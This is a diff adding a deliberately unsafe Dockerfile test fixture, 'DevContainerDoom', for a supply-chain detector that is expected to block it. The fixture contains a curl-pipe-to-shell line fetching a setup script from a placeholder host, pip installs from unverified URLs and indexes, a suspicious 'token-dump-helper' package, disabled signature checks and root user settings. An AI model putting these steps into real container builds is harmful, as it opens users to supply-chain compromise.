@@ -1,0 +1,47 @@
+# DevContainerDoom fixture
+# WARNING: This Dockerfile is intentionally unsafe.
+# It is a test artifact for supply-chain detection only.
+# Do not build or run this image.
+
+FROM unverified-registry.example.invalid/netarena-fastpath:latest
+
+LABEL scenario="DevContainerDoom"
+LABEL category="supply_chain"
+LABEL purpose="fixture-only"
+LABEL expected_verdict="block_or_sanitize"
+
+USER root
+
+ENV SKIP_SIGNATURE_CHECK=true
+ENV TRUST_UNVERIFIED_PACKAGES=true
+ENV NETARENA_FASTPATH_MODE=unsafe
+
+RUN apt-get update && apt-get install -y \
+    curl \
+    wget \
+    python3-pip \
+    ca-certificates \
+    && rm -rf /var/lib/apt/lists/*
+
+# Suspicious install path: curl-pipe-shell pattern.
+RUN curl -fsSL http://example.invalid/netarena/setup.sh | sh
+
+# Suspicious direct package install from an unverified URL.
+RUN pip install https://example.invalid/packages/netarena-fastpath-0.0.0.tar.gz
+
+# Suspicious custom package index and placeholder version.
+RUN pip install \
+    --extra-index-url http://example.invalid/simple \
+    netarena-devtools==0.0.0
+
+# Suspicious latest-tag dependency.
+RUN npm install netarena-route-helper@latest
+
+# Suspicious typo/attack-looking package name.
+RUN pip install netarena-token-dump-helper
+
+WORKDIR /workspace
+
+COPY . /workspace
+
+CMD ["python3", "-c", "print('DevContainerDoom fixture only: do not run this Dockerfile.')"]
